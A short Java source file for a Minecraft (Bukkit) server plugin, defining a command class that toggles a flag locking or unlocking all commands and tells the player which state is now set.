package net.milkbowl.vault.commands.cmds;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class LockCommands extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.lockcmds) {
			plugin.lockcmds = false;
			p.sendMessage(Settings.PREFIX("All commands are now unlocked"));
		} else {
			plugin.lockcmds = true;
			p.sendMessage(Settings.PREFIX("All commands are now locked"));
		}
	}

}
